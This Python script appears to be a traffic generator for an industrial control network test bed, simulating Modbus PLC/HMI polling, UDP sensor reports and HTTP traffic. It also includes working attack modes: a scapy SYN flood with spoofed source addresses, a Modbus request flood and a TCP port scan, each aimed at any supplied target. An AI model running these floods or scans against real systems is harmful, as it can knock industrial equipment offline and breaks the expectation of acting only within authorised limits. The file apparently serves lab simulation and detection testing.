#!/usr/bin/env python3
"""
工业控制网络流量生成器 (Modbus/TCP, UDP Sensor, HTTP Stream)
用于模拟各类工业网络流量。

依赖: pymodbus, requests (可选)
安装: pip install pymodbus requests

使用方法:
1. Modbus Server (PLC):
   python3 traffic_generator.py modbus-server --port 5020

2. Modbus Client (HMI):
   python3 traffic_generator.py modbus-client --target <PLC_IP> --port 5020 --interval 2

3. UDP Sensor (Sender):
   python3 traffic_generator.py udp-sensor --target <SCADA_IP> --port 9000 --interval 0.5

4. UDP Receiver (SCADA/Historian):
   python3 traffic_generator.py udp-server --port 9000

5. HTTP Server (Web Portal):
   python3 traffic_generator.py http-server --port 8080

6. HTTP Client (Workstation):
   python3 traffic_generator.py http-client --target <WEB_IP> --port 8080 --interval 5
"""

import argparse
import time
import logging
import sys
import random
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# Scapy Imports for Attack Simulation
try:
    from scapy.all import IP, TCP, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Warning: scapy not installed. SYN Flood mode will fail.")

# Modbus Imports
try:
    from pymodbus.server import StartTcpServer
    from pymodbus.client import ModbusTcpClient
    from pymodbus.datastore import ModbusSequentialDataBlock, ModbusServerContext
    try:
        from pymodbus.datastore import ModbusSlaveContext
    except ImportError:
        from pymodbus.datastore import ModbusDeviceContext as ModbusSlaveContext
except ImportError:
    print("Warning: pymodbus not installed. Modbus modes will fail.")

# 配置日志
logging.basicConfig(format='%(asctime)s [%(levelname)s] %(message)s', level=logging.INFO)
log = logging.getLogger()

# --- Attack Logic ---

def run_syn_flood(target_ip, port, count=1000):
    """运行 TCP SYN Flood 攻击"""
    if not SCAPY_AVAILABLE:
        log.error("[!] Scapy not available. Cannot run SYN Flood.")
        return

    log.info(f"[*] Starting SYN Flood -> {target_ip}:{port} (Count: {count})...")
    
    # 构造 SYN 包
    # 源 IP 伪造为随机
    for i in range(count):
        src_ip = f"10.0.{random.randint(1,254)}.{random.randint(1,254)}"
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=random.randint(1000, 9000))
        pkt = ip / tcp
        send(pkt, verbose=0)
        if i % 100 == 0:
            log.info(f"[!] Sent {i} SYN packets...")
            
    log.info("[*] SYN Flood completed.")

def run_modbus_flood(target_ip, port, count=1000):
    """运行 Modbus 协议泛洪攻击 (应用层 DoS)"""
    log.info(f"[*] Starting Modbus Flood -> {target_ip}:{port} (Count: {count})...")
    client = ModbusTcpClient(target_ip, port=port)
    
    if not client.connect():
        log.error(f"[!] Cannot connect to {target_ip}:{port}")
        return

    try:
        for i in range(count):
            # 快速发送读取请求，不等待间隔
            client.read_holding_registers(0, count=10, device_id=1)
            if i % 100 == 0:
                log.info(f"[!] Sent {i} Modbus requests...")
    except Exception as e:
        log.error(f"[!] Flood error: {e}")
    finally:
        client.close()
    log.info("[*] Modbus Flood completed.")

def run_port_scan(target_ip, start_port=1, end_port=1024):
    """运行简单的 TCP 端口扫描"""
    log.info(f"[*] Starting Port Scan -> {target_ip} ({start_port}-{end_port})...")
    
    open_ports = []
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            log.info(f"[+] Port {port} is OPEN")
            open_ports.append(port)
        sock.close()
        
    log.info(f"[*] Scan completed. Open ports: {open_ports}")

# --- Modbus Logic ---
def run_modbus_server(port):
    """运行 Modbus TCP 服务器 (模拟 PLC)"""
    log.info(f"[*] Starting Modbus Server (PLC) on port {port}...")
    store = ModbusSlaveContext(
        di=ModbusSequentialDataBlock(0, [0]*100),
        co=ModbusSequentialDataBlock(0, [0]*100),
        hr=ModbusSequentialDataBlock(0, [17]*100),
        ir=ModbusSequentialDataBlock(0, [0]*100))
    context = ModbusServerContext(devices=store, single=True)
    try:
        StartTcpServer(context=context, address=("0.0.0.0", port))
    except Exception as e:
        log.error(f"[!] Modbus Server error: {e}")

def run_modbus_client(target_ip, port, interval):
    """运行 Modbus TCP 客户端 (模拟 HMI/SCADA)"""
    log.info(f"[*] Starting Modbus Client (HMI) -> {target_ip}:{port}...")
    client = ModbusTcpClient(target_ip, port=port)
    
    try:
        if not client.connect():
            log.error(f"[!] Cannot connect to {target_ip}:{port}")
            return

        log.info(f"[+] Connected. Polling every {interval}s...")
        while True:
            rr = client.read_holding_registers(0, count=10, device_id=1)
            if rr.isError():
                log.warning(f"[!] Read Error: {rr}")
            else:
                log.info(f"[>] Read Registers: {rr.registers}")
            
            if random.random() < 0.1:
                val = random.randint(0, 100)
                log.info(f"[<] Write Command: Reg 0 = {val}")
                client.write_register(0, val, device_id=1)
            
            time.sleep(interval)
    except KeyboardInterrupt:
        log.info("Stopping client...")
    finally:
        client.close()

# --- UDP Sensor Logic ---
def run_udp_server(port):
    """运行 UDP 接收端 (模拟 SCADA/Historian 接收传感器数据)"""
    log.info(f"[*] Starting UDP Server on port {port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    
    while True:
        data, addr = sock.recvfrom(1024)
        log.info(f"[<] Received UDP from {addr}: {data.decode().strip()}")

def run_udp_sensor(target_ip, port, interval):
    """运行 UDP 发送端 (模拟传感器上报)"""
    log.info(f"[*] Starting UDP Sensor -> {target_ip}:{port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    cnt = 0
    try:
        while True:
            cnt += 1
            msg = f"SENSOR_DATA_ID_{cnt}_TEMP_{random.randint(20,80)}"
            sock.sendto(msg.encode(), (target_ip, port))
            log.info(f"[>] Sent: {msg}")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

# --- HTTP Logic ---
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"ICS-Guard Web Portal Status: OK\nSystem Normal.")

def run_http_server(port):
    """运行简单 HTTP 服务器"""
    log.info(f"[*] Starting HTTP Server on port {port}...")
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

def run_http_client(target_ip, port, interval):
    """运行 HTTP 客户端 (模拟定期访问)"""
    import urllib.request
    url = f"http://{target_ip}:{port}"
    log.info(f"[*] Starting HTTP Client -> {url}...")
    
    try:
        while True:
            try:
                with urllib.request.urlopen(url, timeout=2) as response:
                    data = response.read()
                    log.info(f"[>] HTTP GET {response.status}: {len(data)} bytes")
            except Exception as e:
                log.error(f"[!] HTTP Error: {e}")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Industrial Traffic Generator")
    subparsers = parser.add_subparsers(dest="mode", help="Mode")
    
    # Modbus Server
    p_ms = subparsers.add_parser("modbus-server")
    p_ms.add_argument("--port", type=int, default=5020)
    
    # Modbus Client
    p_mc = subparsers.add_parser("modbus-client")
    p_mc.add_argument("--target", required=True)
    p_mc.add_argument("--port", type=int, default=5020)
    p_mc.add_argument("--interval", type=float, default=2.0)

    # UDP Server
    p_us = subparsers.add_parser("udp-server")
    p_us.add_argument("--port", type=int, default=9000)

    # UDP Sensor
    p_uc = subparsers.add_parser("udp-sensor")
    p_uc.add_argument("--target", required=True)
    p_uc.add_argument("--port", type=int, default=9000)
    p_uc.add_argument("--interval", type=float, default=1.0)

    # HTTP Server
    p_hs = subparsers.add_parser("http-server")
    p_hs.add_argument("--port", type=int, default=8080)

    # HTTP Client
    p_hc = subparsers.add_parser("http-client")
    p_hc.add_argument("--target", required=True)
    p_hc.add_argument("--port", type=int, default=8080)
    p_hc.add_argument("--interval", type=float, default=5.0)

    # Attack: SYN Flood
    p_syn = subparsers.add_parser("syn-flood")
    p_syn.add_argument("--target", required=True)
    p_syn.add_argument("--port", type=int, default=80)
    p_syn.add_argument("--count", type=int, default=1000)

    # Attack: Modbus Flood
    p_mf = subparsers.add_parser("modbus-flood")
    p_mf.add_argument("--target", required=True)
    p_mf.add_argument("--port", type=int, default=5020)
    p_mf.add_argument("--count", type=int, default=1000)

    # Attack: Port Scan
    p_ps = subparsers.add_parser("port-scan")
    p_ps.add_argument("--target", required=True)
    p_ps.add_argument("--start-port", type=int, default=1)
    p_ps.add_argument("--end-port", type=int, default=100)

    args = parser.parse_args()

    if args.mode == "modbus-server":
        run_modbus_server(args.port)
    elif args.mode == "modbus-client":
        run_modbus_client(args.target, args.port, args.interval)
    elif args.mode == "udp-server":
        run_udp_server(args.port)
    elif args.mode == "udp-sensor":
        run_udp_sensor(args.target, args.port, args.interval)
    elif args.mode == "http-server":
        run_http_server(args.port)
    elif args.mode == "http-client":
        run_http_client(args.target, args.port, args.interval)
    elif args.mode == "syn-flood":
        run_syn_flood(args.target, args.port, args.count)
    elif args.mode == "modbus-flood":
        run_modbus_flood(args.target, args.port, args.count)
    elif args.mode == "port-scan":
        run_port_scan(args.target, args.start_port, args.end_port)
    else:
        parser.print_help()
